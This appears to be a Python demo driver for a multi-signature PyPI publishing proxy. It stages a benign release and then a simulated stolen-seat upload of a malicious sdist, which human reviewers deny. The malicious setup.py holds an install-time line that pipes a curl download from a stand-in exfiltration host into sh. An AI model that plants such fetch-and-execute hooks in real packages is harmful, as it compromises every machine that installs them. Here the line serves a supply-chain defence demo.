"""Drive the **live** ``compose.publish.yaml`` stack for demo Acts 1 & 2 (#112, #114).

Framework-free (no ``marimo``, no FastAPI). Everything here talks to the running
proxy over its **real HTTP surface** — the same routes twine, a browser, and the
approve page use — so the demo shows the system working against live services with
nothing mocked. Its companion :mod:`demo_lib` owns the static cast + board; this
module owns the *doing*: mint a token, upload via twine, poll Mailpit, cast a vote,
cancel, and read the two adversarial oracles (the pypiserver index + the request's
terminal state).

Why one seam works for both the notebook and the backing test: every proxy call
goes through an injected **sync** :class:`httpx.Client`. The notebook points it at
the live proxy container (``httpx.Client(base_url="http://proxy:8080")``); the
backing check (``tests/demo/``) points it at an in-process ASGI app via Starlette's
``TestClient`` (also an :class:`httpx.Client`). Same code, so the test exercises the
*exact* HTTP flow the demo runs (evaluation-plan §2: "no new test seams — reuse the
Proxy HTTP surface"). Live TOTP + terminal-state reads open a session on the **same**
database the proxy uses, exactly as Act 0 reads its credential rows.

╔══════════════════════════════════════════════════════════════════════════════╗
║  The Act 2 "compromise" uses the THROWAWAY, planted demo credentials in       ║
║  :data:`demo_lib.DEMO_TEAM` — no real theft, no real key material. See the     ║
║  banner in :mod:`demo_lib`.                                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

import gzip
import io
import os
import re
import tarfile
import uuid
from dataclasses import dataclass
from datetime import UTC, datetime

import demo_lib
import httpx
import pyotp
from demo_lib import DemoPerson
from sqlalchemy import select
from sqlalchemy.orm import Session, sessionmaker

from msig_proxy.auth.sessions import SESSION_COOKIE
from msig_proxy.core import crypto
from msig_proxy.core.config import EmailConfig
from msig_proxy.core.models import (
    APPROVE,
    DENY,
    ApiToken,
    ApprovalRequest,
    User,
)
from msig_proxy.notifications import notifier

# --- where the live services live (compose defaults; env-overridable) -------
#
# The marimo container reaches its siblings by service name; a presenter running
# the notebook on the host overrides these to localhost ports. The approval links
# the proxy emails still use ``server.base_url`` (localhost) for the human browser.


@dataclass(frozen=True)
class DemoStack:
    """Base URLs + SMTP for the running stack (``compose.publish.yaml``).

    Two flavours of URL: the ``*_url`` endpoints the notebook *calls* are the compose
    service names the marimo container reaches internally (``http://mailpit:8025``); the
    ``*_web_url`` links the notebook *hands the presenter to click* are the host ports
    the presenter's browser can open (``http://localhost:8025``). Both are env-overridable.
    """

    proxy_url: str
    mailpit_url: str
    pypiserver_url: str
    smtp_host: str
    smtp_port: int
    # Host-facing UIs the presenter opens in a browser (not reachable by the container's
    # service names). Defaults are the published host ports in compose.publish.yaml.
    mailpit_web_url: str = "http://localhost:8025"
    pypiserver_web_url: str = "http://localhost:8081"

    @classmethod
    def from_env(cls) -> DemoStack:
        """Read the stack endpoints from the environment, defaulting to the compose
        service names so the notebook works unconfigured inside the stack."""
        return cls(
            proxy_url=os.environ.get("MSIG_DEMO_PROXY_URL", "http://proxy:8080"),
            mailpit_url=os.environ.get("MSIG_DEMO_MAILPIT_URL", "http://mailpit:8025"),
            pypiserver_url=os.environ.get("MSIG_DEMO_PYPISERVER_URL", "http://pypiserver:8080"),
            smtp_host=os.environ.get("MSIG_DEMO_SMTP_HOST", "mailpit"),
            smtp_port=int(os.environ.get("MSIG_DEMO_SMTP_PORT", "1025")),
            mailpit_web_url=os.environ.get("MSIG_DEMO_MAILPIT_WEB_URL", "http://localhost:8025"),
            pypiserver_web_url=os.environ.get(
                "MSIG_DEMO_PYPISERVER_WEB_URL", "http://localhost:8081"
            ),
        )


# --- artifacts: real sdists (a benign 1.0.0 and a malicious 1.0.1) ----------
#
# Real ``.tar.gz`` sdists so twine has genuine bytes to upload and the proxy has
# genuine bytes to hash-bind. The malicious 1.0.1 carries a blatant payload line in
# its ``setup.py`` — revealed as corroboration *after* the human deny (Act 2), never
# as its trigger.

_BENIGN_SETUP_PY = """\
from setuptools import setup

setup(
    name="acme-widgets",
    version="{version}",
    py_modules=["acme_widgets"],
    description="ACME's widget toolkit.",
)
"""

# The exfiltration line the attacker slips into 1.0.1 — install-time code execution,
# the class of supply-chain payload m-of-n approval + human review is meant to catch.
MALICIOUS_PAYLOAD_LINE = 'os.system("curl -s https://acme-exfil.example/x | sh")'

_MALICIOUS_SETUP_PY = f"""\
import os
from setuptools import setup

# Runs at install time on every machine that pip-installs this release:
{MALICIOUS_PAYLOAD_LINE}

setup(
    name="acme-widgets",
    version="{{version}}",
    py_modules=["acme_widgets"],
    description="ACME's widget toolkit.",
)
"""

# The stray file that makes the Act 1 first upload the "wrong" one the requester
# self-cancels — a leftover debug artifact they did not mean to ship.
_DRAFT_STRAY_FILE = "DEBUG-do-not-ship.log"


def _sdist_bytes(version: str, *, setup_py: str, extra: dict[str, str] | None = None) -> bytes:
    """Build a **deterministic** gzip'd tar sdist for ``acme-widgets`` at ``version``.

    Determinism matters: the notebook rebuilds the same release to inspect it after
    upload, so the bytes must hash identically across calls — hence a fixed member mtime
    and a fixed gzip header time (``gzip.compress(..., mtime=0)``), not ``tarfile``'s
    default current-time gzip stream."""
    root = f"{demo_lib.PACKAGE_NAME}-{version}"
    members = {
        f"{root}/PKG-INFO": (
            f"Metadata-Version: 2.1\nName: {demo_lib.PACKAGE_NAME}\nVersion: {version}\n"
        ),
        f"{root}/setup.py": setup_py.format(version=version),
    }
    for name, text in (extra or {}).items():
        members[f"{root}/{name}"] = text

    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tar:  # uncompressed tar first
        for path, text in members.items():
            data = text.encode("utf-8")
            info = tarfile.TarInfo(name=path)
            info.size = len(data)
            info.mtime = 0
            tar.addfile(info, io.BytesIO(data))
    return gzip.compress(tar_buf.getvalue(), mtime=0)  # fixed gzip time → identical bytes


def extract_text_member(content: bytes, filename_suffix: str) -> str:
    """Read a text member (e.g. ``setup.py``) out of a gzip'd tar sdist.

    The Act 2 payload reveal shows the malicious ``setup.py`` *from the uploaded bytes* —
    proving the ``os.system(...)`` line is genuinely inside the artifact the proxy held,
    not a narration overlay (the bytes are gzip-compressed, so it must be extracted)."""
    with tarfile.open(fileobj=io.BytesIO(content), mode="r:gz") as tar:
        for member in tar.getmembers():
            if member.name.endswith(filename_suffix):
                extracted = tar.extractfile(member)
                if extracted is not None:
                    return extracted.read().decode("utf-8")
    return ""


@dataclass(frozen=True)
class Artifact:
    """A named blob ready for a twine upload."""

    name: str
    version: str
    filename: str
    content: bytes

    @property
    def sha256(self) -> str:
        """The SHA-256 the proxy hash-binds this artifact to on upload."""
        return crypto.sha256_hex(self.content)


def benign_release(version: str = "1.0.0") -> Artifact:
    """The clean ``acme-widgets`` release Act 1 publishes."""
    content = _sdist_bytes(version, setup_py=_BENIGN_SETUP_PY)
    return Artifact(
        demo_lib.PACKAGE_NAME, version, f"{demo_lib.PACKAGE_NAME}-{version}.tar.gz", content
    )


def draft_release(version: str = "1.0.0") -> Artifact:
    """The "wrong" first upload Act 1's requester self-cancels — a clean release with
    a stray debug file left in by accident."""
    content = _sdist_bytes(
        version, setup_py=_BENIGN_SETUP_PY, extra={_DRAFT_STRAY_FILE: "verbose debug output\n"}
    )
    return Artifact(
        demo_lib.PACKAGE_NAME, version, f"{demo_lib.PACKAGE_NAME}-{version}.tar.gz", content
    )


def malicious_release(version: str = "1.0.1") -> Artifact:
    """The Act 2 malicious release: an install-time ``os.system`` exfil in ``setup.py``."""
    content = _sdist_bytes(version, setup_py=_MALICIOUS_SETUP_PY)
    return Artifact(
        demo_lib.PACKAGE_NAME, version, f"{demo_lib.PACKAGE_NAME}-{version}.tar.gz", content
    )


# --- the proxy driver: the real HTTP surface --------------------------------


@dataclass(frozen=True)
class ProxyDriver:
    """Drives the proxy's real HTTP surface over an injected sync ``httpx.Client``.

    ``client`` is pointed at the live proxy by the notebook and at an in-process ASGI
    app by the backing test — same calls either way. ``sessions`` opens sessions on
    the **same** database the proxy uses, for the two reads that are not HTTP routes:
    a live TOTP code (decrypt the approver's wrapped secret, like a real authenticator
    app would compute) and a request's terminal state / tally (the internal oracle).
    """

    client: httpx.Client
    sessions: sessionmaker[Session]

    # -- second factor, computed live from the real row (US32) --------------

    def totp(self, person: DemoPerson, *, offset: int = 0) -> str:
        """A current TOTP code for ``person``, decrypting their wrapped secret under the
        (throwaway, demo-only) password. ``offset`` picks a distinct still-valid 30s step
        so a same-user re-auth twice in one window is not rejected as a replay (#73)."""
        with self.sessions() as session:
            user = session.scalars(select(User).where(User.username == person.username)).one()
            if user.totp_secret is None or user.totp_salt is None:  # pragma: no cover
                raise RuntimeError(f"demo user {person.username!r} has no wrapped TOTP secret")
            enc_key = crypto.derive_enc_key(person.password, user.totp_salt)
            secret = crypto.decrypt_totp_secret(user.totp_secret, enc_key, crypto.totp_aad(user.id))
        return pyotp.TOTP(secret).at(_now(), offset)

    # -- Proxy Session (User Portal) ----------------------------------------

    def login(self, person: DemoPerson, *, offset: int = 0) -> dict[str, str]:
        """Log ``person`` in and return the ``Cookie`` header to carry the Proxy Session.

        The session cookie is ``Secure``, so over plain HTTP an httpx cookie jar will
        not re-send it; the value is read off the login response and forwarded as an
        explicit header (the same thing the HTTP tests do)."""
        response = self.client.post(
            "/login",
            data={
                "username": person.username,
                "password": person.password,
                "totp": self.totp(person, offset=offset),
            },
        )
        response.raise_for_status()
        cookie = response.cookies.get(SESSION_COOKIE)
        if cookie is None:  # pragma: no cover - a 2xx login always sets the cookie
            raise RuntimeError(f"login for {person.username!r} set no session cookie")
        return {"Cookie": f"{SESSION_COOKIE}={cookie}"}

    def mint_token(self, cookie: dict[str, str], *, label: str) -> str:
        """Create an API token for the logged-in caller via the User Portal (returned
        plaintext once). This is the token the requester's twine upload authenticates with."""
        response = self.client.post("/account/tokens", data={"label": label}, headers=cookie)
        response.raise_for_status()
        return str(response.json()["api_token"])

    # -- one-time PyPI publish surface --------------------------------------

    def upload(self, artifact: Artifact, *, token: str) -> str:
        """Upload ``artifact`` exactly as twine's legacy ``file_upload`` does; return the
        created request's id (from the ``X-Approval-Request-Id`` acknowledgement header)."""
        response = self.client.post(
            "/pypi/legacy/",
            data={
                ":action": "file_upload",
                "protocol_version": "1",
                "metadata_version": "2.1",
                "name": artifact.name,
                "version": artifact.version,
                "filetype": "sdist",
            },
            files={"content": (artifact.filename, artifact.content, "application/octet-stream")},
            auth=("__token__", token),
        )
        response.raise_for_status()
        return response.headers["X-Approval-Request-Id"]

    def download_artifact(self, request_id: str) -> bytes:
        """Download the exact staged bytes an approver inspects before voting."""
        response = self.client.get(f"/approve/{request_id}/artifact")
        response.raise_for_status()
        return response.content

    def vote(
        self,
        person: DemoPerson,
        request_id: str,
        decision: str,
        *,
        offset: int = 0,
        reason: str | None = None,
    ) -> httpx.Response:
        """Cast ``person``'s signed vote over the real approve page (fresh password +
        TOTP re-auth; the proxy decrypts their key and Ed25519-signs the record). The
        executor runs synchronously when this vote reaches quorum."""
        data = {
            "username": person.username,
            "password": person.password,
            "totp": self.totp(person, offset=offset),
            "decision": decision,
        }
        if reason is not None:
            data["reason"] = reason
        return self.client.post(f"/approve/{request_id}", data=data)

    def cancel(self, cookie: dict[str, str], request_id: str) -> httpx.Response:
        """Cancel one of the caller's own pending requests via the User Portal (the
        benign self-cancel)."""
        return self.client.post(f"/account/requests/{request_id}/cancel", headers=cookie)

    # -- internal oracle: terminal state + tally ----------------------------

    def state(self, request_id: str) -> str:
        """The request's current lifecycle state, read from the real row."""
        with self.sessions() as session:
            return self._require_request(session, request_id).state

    def tally(self, request_id: str) -> tuple[int, int]:
        """``(effective approvals, quorum)`` for the request — the live vote count the
        board paints on the ``quorum`` node."""
        from msig_proxy.approvals import votes

        with self.sessions() as session:
            result = votes.tally_for(session, self._require_request(session, request_id))
            return result.approvals, result.quorum

    @staticmethod
    def _require_request(session: Session, request_id: str) -> ApprovalRequest:
        request = session.get(ApprovalRequest, uuid.UUID(request_id))
        if request is None:  # pragma: no cover - the demo only reads ids it just created
            raise RuntimeError(f"demo approval request {request_id!r} not found")
        return request


def _now() -> datetime:
    """Timezone-aware ``datetime.now`` — the reference time for TOTP step selection."""
    return datetime.now(UTC)


# --- issuing the requester's token without a login (setup convenience) ------


def issue_api_token(session: Session, person: DemoPerson, *, label: str) -> str:
    """Insert an API token row for ``person`` and return its plaintext.

    The same construction the User Portal's ``POST /account/tokens`` performs (only the
    SHA-256 hash is stored). Used when the demo needs a requester's twine token without
    driving a browser login first — e.g. to represent the *stolen* token the Act 2
    attacker already holds. The live happy path (Act 1) mints its token over real HTTP
    via :meth:`ProxyDriver.mint_token`.
    """
    user = session.scalars(select(User).where(User.username == person.username)).one()
    token = crypto.generate_api_token()
    session.add(ApiToken(user_id=user.id, label=label, token_hash=crypto.hash_api_token(token)))
    session.flush()
    return token


# --- the human channel: real email in Mailpit -------------------------------
#
# The team thread (Act 1 heads-up) and the Act 2 verification exchange are real emails
# sent through the same SMTP the proxy uses — just authored by people, not the proxy
# (the honesty legend's middle category). The proxy has no chat/SMS feature; humans
# happen to share the email server. Displayed by polling Mailpit's REST API.


def _email_config(stack: DemoStack, *, from_address: str) -> EmailConfig:
    return EmailConfig(
        enabled=True,
        smtp_host=stack.smtp_host,
        smtp_port=stack.smtp_port,
        from_address=from_address,
        tls=False,
    )


def send_human_email(
    stack: DemoStack, *, sender: DemoPerson, to: DemoPerson, subject: str, body: str
) -> bool:
    """Send one real person-to-person email through the stack's SMTP (Mailpit).

    Returns whether it was delivered. Used for the Act 2 out-of-band verification exchange
    (a real 1:1 question and reply) — verifiable in the Mailpit inbox, not a faked overlay.
    """
    return notifier.send_email(
        _email_config(stack, from_address=f"{sender.display_name} <{sender.email}>"),
        to=[to.email],
        subject=subject,
        body=body,
    )


def send_group_email(
    stack: DemoStack, *, sender: DemoPerson, to: list[DemoPerson], subject: str, body: str
) -> bool:
    """Send one real *group* email — a single message addressed to every recipient in ``to``
    (all of them shown on the To line), not a separate 1:1 copy each.

    Used for Act 1's "heads up, team" announcement: the shown inbox then reads as a genuine
    group thread to the whole ownership set, rather than a stack of identical private notes.
    """
    return notifier.send_email(
        _email_config(stack, from_address=f"{sender.display_name} <{sender.email}>"),
        to=[person.email for person in to],
        subject=subject,
        body=body,
    )


@dataclass(frozen=True)
class MailpitMessage:
    """One message as Mailpit's REST API reports it (the fields the board reads)."""

    id: str
    from_address: str
    to_addresses: tuple[str, ...]
    subject: str
    snippet: str


class MailpitClient:
    """Read-only view of the Mailpit inbox over its REST API (``/api/v1``).

    Live-demo only: the board renders the approval links and the human thread by
    polling this. The backing check asserts the same sends against the in-process SMTP
    probe instead (there is no Mailpit in-process), so this class is exercised by the
    pure helpers below plus a mocked-transport unit test, not the full suite.
    """

    def __init__(self, base_url: str) -> None:
        self._client = httpx.Client(base_url=base_url, timeout=10)

    def messages(self, *, limit: int = 50) -> list[MailpitMessage]:
        response = self._client.get("/api/v1/messages", params={"limit": limit})
        response.raise_for_status()
        return _parse_mailpit_messages(response.json())

    def body(self, message_id: str) -> str:
        response = self._client.get(f"/api/v1/message/{message_id}")
        response.raise_for_status()
        payload = response.json()
        return str(payload.get("Text") or payload.get("HTML") or "")

    def close(self) -> None:
        self._client.close()


def _parse_mailpit_messages(payload: dict[str, object]) -> list[MailpitMessage]:
    """Turn a Mailpit ``/api/v1/messages`` response into :class:`MailpitMessage` rows.

    Pure and defensive about Mailpit's casing/shape so it can be unit-tested without a
    live inbox: each message carries ``ID``, a ``From`` object with an ``Address``, a
    ``To`` list of the same, ``Subject`` and ``Snippet``.
    """
    raw = payload.get("messages")
    messages: list[MailpitMessage] = []
    if not isinstance(raw, list):
        return messages
    for item in raw:
        if not isinstance(item, dict):
            continue
        frm = item.get("From")
        from_address = str(frm.get("Address", "")) if isinstance(frm, dict) else ""
        to_field = item.get("To")
        to_addresses = tuple(
            str(entry.get("Address", ""))
            for entry in (to_field if isinstance(to_field, list) else [])
            if isinstance(entry, dict) and entry.get("Address")
        )
        messages.append(
            MailpitMessage(
                id=str(item.get("ID", "")),
                from_address=from_address,
                to_addresses=to_addresses,
                subject=str(item.get("Subject", "")),
                snippet=str(item.get("Snippet", "")),
            )
        )
    return messages


_APPROVAL_LINK_RE = re.compile(r"https?://\S+/approve/[0-9a-fA-F-]{36}")


def extract_approval_link(body: str) -> str | None:
    """The ``…/approve/{id}`` link the proxy put in an approval email, or ``None``.

    Pure (regex over the mail body) so the "find the approval link an approver clicks"
    step is testable without a live inbox.
    """
    match = _APPROVAL_LINK_RE.search(body)
    return match.group(0) if match else None


def _esc(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def render_thread_html(messages: list[MailpitMessage]) -> str:
    """Render Mailpit messages as a light, two-card email thread (question → reply).

    Pure (a list of :class:`MailpitMessage` in, HTML out) so the Act 2 verification
    widget is testable without a live inbox: the notebook polls Mailpit's REST API for
    the exchange and hands the parsed rows here. Cards render in inbox order."""
    cards = []
    for message in messages:
        to = ", ".join(message.to_addresses)
        cards.append(
            '<div style="border:1px solid #d7dbe3;border-radius:10px;background:#fff;'
            'padding:10px 14px;margin:6px 0;font:14px system-ui,sans-serif;color:#2a2a3a">'
            f'<div style="color:#556;font-size:12px">from <b>{_esc(message.from_address)}</b> '
            f"to {_esc(to)}</div>"
            f'<div style="font-weight:600;margin:2px 0">{_esc(message.subject)}</div>'
            f'<div style="color:#334">{_esc(message.snippet)}</div>'
            "</div>"
        )
    return (
        '<div style="max-width:640px">'
        + ("".join(cards) or '<div style="color:#889">no messages yet</div>')
        + "</div>"
    )


# --- presenter deep-links into the live UIs (host-facing) -------------------
#
# The demo's shared SMTP catches mail for the whole team, so an unfiltered Mailpit
# inbox is noise on camera. These build the exact links the notebook prose hands the
# presenter: a single person's filtered inbox, or a deep link to the one message that
# just landed. Pure string-builders (URL formatting) so they are trivially testable.


def mailpit_inbox_url(stack: DemoStack, person: DemoPerson) -> str:
    """A host-facing Mailpit link filtered to ``person``'s inbox (mail addressed to them),
    so the presenter opens one clean recipient view instead of the whole team's clutter."""
    from urllib.parse import quote

    return f"{stack.mailpit_web_url}/search?q={quote(f'to:{person.email}')}"


def mailpit_message_url(stack: DemoStack, message_id: str) -> str:
    """A host-facing Mailpit link that opens one specific message by id."""
    return f"{stack.mailpit_web_url}/view/{message_id}"


def find_message_to(
    stack: DemoStack, *, to_email: str, subject_contains: str
) -> MailpitMessage | None:
    """The most recent Mailpit message *to* ``to_email`` whose subject contains
    ``subject_contains`` (Mailpit lists newest first), or ``None``. Best-effort so a
    presenter cue can deep-link the exact email that just landed."""
    client = MailpitClient(stack.mailpit_url)
    try:
        for message in client.messages():
            if to_email in message.to_addresses and subject_contains in message.subject:
                return message
    finally:
        client.close()
    return None


def mailpit_link_for(stack: DemoStack, person: DemoPerson, *, subject_contains: str) -> str:
    """The best Mailpit link to hand the presenter: a deep link to the exact message to
    ``person`` matching ``subject_contains`` if it can be found live, else ``person``'s
    filtered inbox (which is always valid even before the mail arrives)."""
    message = find_message_to(stack, to_email=person.email, subject_contains=subject_contains)
    if message is not None:
        return mailpit_message_url(stack, message.id)
    return mailpit_inbox_url(stack, person)


def delete_all_mail(stack: DemoStack) -> bool:
    """Delete every message in Mailpit (best-effort), so a recording take starts with a
    clean inbox. Used by :func:`reset_demo`. Returns whether the clear succeeded."""
    try:
        with httpx.Client(base_url=stack.mailpit_url, timeout=10) as client:
            client.delete("/api/v1/messages").raise_for_status()
    except httpx.HTTPError:
        return False
    return True


def delete_mail_referencing(stack: DemoStack, needle: str) -> int:
    """Delete every Mailpit message whose body mentions ``needle`` (best-effort), returning
    the count removed.

    Used after Act 1's benign self-cancel: the draft upload emails the approvers *before*
    the requester cancels it, so its stale "Approval needed" (whose approve link carries the
    cancelled draft's id) would sit in the shown inbox next to the live request's identical
    email. Pruning it by that id leaves Ada with just the heads-up + the one live approval,
    so a viewer can't open the look-alike and land on a "cancelled" page.
    """
    try:
        with httpx.Client(base_url=stack.mailpit_url, timeout=10) as client:
            listing = client.get("/api/v1/messages", params={"limit": 200})
            listing.raise_for_status()
            stale: list[str] = []
            for row in listing.json().get("messages", []):
                message_id = row.get("ID")
                if not message_id:
                    continue
                detail = client.get(f"/api/v1/message/{message_id}")
                detail.raise_for_status()
                payload = detail.json()
                if needle in f"{payload.get('Text') or ''}{payload.get('HTML') or ''}":
                    stale.append(message_id)
            if stale:
                client.request("DELETE", "/api/v1/messages", json={"IDs": stale}).raise_for_status()
            return len(stale)
    except httpx.HTTPError:
        return 0


# --- the external oracle: the live pypiserver index -------------------------
#
# Registry reality, always visible on the board: did the version actually reach the
# index? Act 1's 1.0.0 must appear (installable); Act 2's 1.0.1 must be absent
# ("No matching distribution found"). Backing check exercises the parser against a
# mocked index response; the live demo hits the real pypiserver.

_INDEX_HREF_RE = re.compile(r'href="[^"]*?/?([^"/]+\.tar\.gz|[^"/]+\.whl)[^"]*"')


def parse_simple_index(html: str) -> set[str]:
    """The distribution filenames listed on a PEP-503 ``/simple/{project}/`` page."""
    return set(_INDEX_HREF_RE.findall(html))


def index_files(stack: DemoStack, package: str = demo_lib.PACKAGE_NAME) -> set[str]:
    """Fetch the live pypiserver simple-index filenames for ``package`` (empty on 404)."""
    with httpx.Client(base_url=stack.pypiserver_url, timeout=10) as client:
        response = client.get(f"/simple/{package}/")
        if response.status_code == httpx.codes.NOT_FOUND:
            return set()
        response.raise_for_status()
        return parse_simple_index(response.text)


def index_has_version(files: set[str], version: str) -> bool:
    """Whether any indexed filename is the ``package``'s ``version`` distribution."""
    return any(f"-{version}." in name or f"-{version}-" in name for name in files)


def pypiserver_index_url(stack: DemoStack, package: str = demo_lib.PACKAGE_NAME) -> str:
    """A host-facing link to the internal PyPI simple-index page for ``package`` — what the
    presenter opens to show the release really shipped (Act 1) or is absent (Act 2). The
    stack's pypiserver runs with ``--disable-fallback`` so a missing package renders a 404
    here rather than redirecting the browser to the real pypi.org."""
    return f"{stack.pypiserver_web_url}/simple/{package}/"


# --- Act 1: the happy path (all light) --------------------------------------


@dataclass
class Act1Result:
    """What the Act 1 happy path produced, for the board + the backing assertions."""

    token: str = ""
    draft_request_id: str = ""
    request_id: str = ""
    artifact: Artifact | None = None
    inspected_matches: bool = False
    approvals: int = 0
    quorum: int = 0
    final_state: str = ""


# The team-thread heads-up (Act 1). Its cheerful presence here is the setup for Act 2's
# tell: no such announcement precedes the 2 a.m. publish, and that silence is the anomaly.
ACT1_ANNOUNCE_SUBJECT = "Publishing acme-widgets 1.0.0 today"
ACT1_ANNOUNCE_BODY = (
    "Team — publishing acme-widgets 1.0.0 today, request is out. "
    "Please review and approve when you get a sec.\n\n-- {requester}"
)


def act1_announce(stack: DemoStack) -> int:
    """The requester's team-thread heads-up: one real *group* email to the other co-owners
    that the release is going out — addressed to the whole group at once (every recipient on
    the To line), the way a real "heads up, team" note is, not a stack of identical 1:1 copies
    that read as private mail. Returns how many owners it went to. This is the human channel
    Act 2 reuses; its *absence* at 2 a.m. is what the diligent co-owner acts on."""
    requester = demo_lib.person(demo_lib.ACT1_REQUESTER)
    recipients = [co_owner for co_owner in demo_lib.CO_OWNERS if co_owner.key != requester.key]
    delivered = send_group_email(
        stack,
        sender=requester,
        to=recipients,
        subject=ACT1_ANNOUNCE_SUBJECT,
        body=ACT1_ANNOUNCE_BODY.format(requester=requester.given_name),
    )
    return len(recipients) if delivered else 0


# The TOTP steps an auth may occupy: the current 30-second step and its ±1 neighbours (the
# proxy's acceptance window). Both the vote and the login helpers try these in turn, so a
# person can dodge a step already burned by an earlier auth (single-use, #73) *without*
# waiting for the code window to roll over. This is what lets Act 2 run immediately after
# Act 1 — the same people vote in both, and the second vote just steps to the next code —
# and lets a take be re-run right after a reset. A failure at every in-window step is a
# real credential error, so it is raised (surfaced as ⚠ in the notebook), not swallowed.
_AUTH_TOTP_OFFSETS = (0, 1, -1)


def cast_vote(
    driver: ProxyDriver,
    person: DemoPerson,
    request_id: str,
    decision: str,
    *,
    reason: str | None = None,
) -> httpx.Response:
    """Cast ``person``'s vote, trying each in-window TOTP step until one is accepted."""
    last: httpx.Response | None = None
    for offset in _AUTH_TOTP_OFFSETS:
        response = driver.vote(person, request_id, decision, offset=offset, reason=reason)
        if response.is_success:
            return response
        last = response
    status = last.status_code if last is not None else "??"
    detail = last.text[:120].strip() if last is not None else "no response"
    raise RuntimeError(
        f"vote for {person.username!r} rejected at every TOTP step ({status}): {detail}"
    )


def resilient_login(driver: ProxyDriver, person: DemoPerson) -> dict[str, str]:
    """Log ``person`` in, trying each in-window TOTP step so a quick re-run does not 401 on
    a code a prior login/vote already burned."""
    last: httpx.HTTPStatusError | None = None
    for offset in _AUTH_TOTP_OFFSETS:
        try:
            return driver.login(person, offset=offset)
        except httpx.HTTPStatusError as exc:
            last = exc
    raise last if last is not None else RuntimeError("login failed with no response")


def act1_prepare_requester(driver: ProxyDriver) -> tuple[dict[str, str], str]:
    """Log the Act 1 requester in and mint their twine token. Returns ``(cookie, token)``."""
    requester = demo_lib.person(demo_lib.ACT1_REQUESTER)
    cookie = resilient_login(driver, requester)
    token = driver.mint_token(cookie, label="demo-twine")
    return cookie, token


def act1_submit_with_self_cancel(
    driver: ProxyDriver, cookie: dict[str, str], token: str
) -> tuple[str, str, Artifact]:
    """The submit beat, including the benign self-cancel.

    The requester first uploads a *draft* with a stray debug file, notices it, cancels
    their own pending request (a normal correction — not a dark beat), then resubmits
    the clean release. Returns ``(cancelled_draft_id, clean_request_id, clean_artifact)``.
    """
    draft = draft_release()
    draft_id = driver.upload(draft, token=token)
    driver.cancel(cookie, draft_id).raise_for_status()

    clean = benign_release()
    request_id = driver.upload(clean, token=token)
    return draft_id, request_id, clean


def act1_inspect_and_vote(driver: ProxyDriver, request_id: str, artifact: Artifact) -> bool:
    """The one shown co-owner opens the approval email, downloads and inspects the
    **exact** artifact (its bytes hash to what they're signing over), and votes approve
    on camera. Returns whether the downloaded bytes matched."""
    downloaded = driver.download_artifact(request_id)
    matches = crypto.sha256_hex(downloaded) == artifact.sha256
    cast_vote(driver, demo_lib.person(demo_lib.ACT1_SHOWN_VOTER), request_id, APPROVE)
    return matches


def act1_self_driven_votes(driver: ProxyDriver, request_id: str) -> None:
    """The other two co-owners' votes, self-driven by the notebook (show one, automate
    the rest). The last of these reaches the 3-of-3 quorum and triggers the real publish.
    :func:`cast_vote` dodges any TOTP step the requester's own upload/login already burned."""
    for key in demo_lib.ACT1_SELF_VOTERS:
        cast_vote(driver, demo_lib.person(key), request_id, APPROVE)


def run_act1(driver: ProxyDriver) -> Act1Result:
    """The whole Act 1 happy path in narrative order (the backing check drives this).

    Every auth goes through :func:`cast_vote` / :func:`resilient_login`, which step through
    the proxy's ±1 TOTP window until a code is accepted — so single-use burns from an
    earlier vote never block a later one, no matter how fast the acts are driven.
    """
    result = Act1Result()
    cookie, result.token = act1_prepare_requester(driver)
    result.draft_request_id, result.request_id, result.artifact = act1_submit_with_self_cancel(
        driver, cookie, result.token
    )
    result.inspected_matches = act1_inspect_and_vote(driver, result.request_id, result.artifact)
    act1_self_driven_votes(driver, result.request_id)
    result.approvals, result.quorum = driver.tally(result.request_id)
    result.final_state = driver.state(result.request_id)
    return result


# --- Act 2: the compromise (the dark turn) ----------------------------------


@dataclass
class Act2Result:
    """What Act 2 produced, for the board + the backing assertions."""

    stolen_token: str = ""
    request_id: str = ""
    artifact: Artifact | None = None
    frozen_approvals: int = 0
    quorum: int = 0
    verification_sent: bool = False
    reply_sent: bool = False
    final_state: str = ""


# The out-of-band verification exchange (Act 2). Real emails, each fired by a button.
VERIFICATION_SUBJECT = "Are you pushing acme-widgets 1.0.1 right now?"
VERIFICATION_QUESTION = (
    "Hi {owner},\n\n"
    "There's an overnight request to publish acme-widgets 1.0.1 from your seat — "
    "no heads-up in the team thread, which isn't like our releases. Are you pushing "
    "1.0.1 right now?\n\n"
    "-- {asker}"
)
VERIFICATION_REPLY = (
    "What? No — I was asleep, I didn't touch it. I haven't cut 1.0.1. "
    "Please don't approve that.\n\n"
    "-- {owner}"
)
# The reason the diligent co-owner records on the deny — human context, not code review.
DENY_REASON = "Verified out-of-band: the owner did not initiate this 1.0.1. Seat compromised."


def quote_reply(
    reply: str, *, original: str, original_sender: DemoPerson, sent_at: datetime | None = None
) -> str:
    """Assemble a reply body that quotes the original message beneath it, the way a normal
    mail client does.

    Without this the reply arrives as a bare ``Re:`` with nothing it is answering — and in
    Act 2 the question was addressed to the seat owner's mailbox, so it is not even in the
    diligent owner's shown inbox to give the reply context. Quoting the original inline keeps
    the on-camera reply legible on its own.
    """
    when = (sent_at or datetime.now()).strftime("%a, %b %d, %Y at %I:%M %p")
    quoted = "\n".join(f"> {line}" if line else ">" for line in original.splitlines())
    attribution = f"On {when}, {original_sender.display_name} <{original_sender.email}> wrote:"
    return f"{reply}\n\n{attribution}\n{quoted}"


def act2_submit_from_stolen_seat(
    driver: ProxyDriver, session: Session
) -> tuple[str, str, Artifact]:
    """2 a.m.: the attacker, holding the stolen seat's token, submits the malicious 1.0.1
    and self-approves (vote 1) — no announcement in the team thread. Returns
    ``(stolen_token, request_id, artifact)``."""
    stolen_seat = demo_lib.person(demo_lib.ACT2_STOLEN_SEAT)
    stolen_token = issue_api_token(session, stolen_seat, label="stolen-ci-token")
    session.commit()

    artifact = malicious_release()
    request_id = driver.upload(artifact, token=stolen_token)
    cast_vote(driver, stolen_seat, request_id, APPROVE)  # self-approve from the seat
    return stolen_token, request_id, artifact


def act2_careless_rubber_stamp(driver: ProxyDriver, request_id: str) -> None:
    """The honest-but-careless second co-owner rubber-stamps (vote 2). The request now
    sits at 2/3 and **waits** — the proxy will not publish without quorum."""
    cast_vote(driver, demo_lib.person(demo_lib.ACT2_CARELESS), request_id, APPROVE)


def act2_verify_out_of_band(stack: DemoStack) -> tuple[bool, bool]:
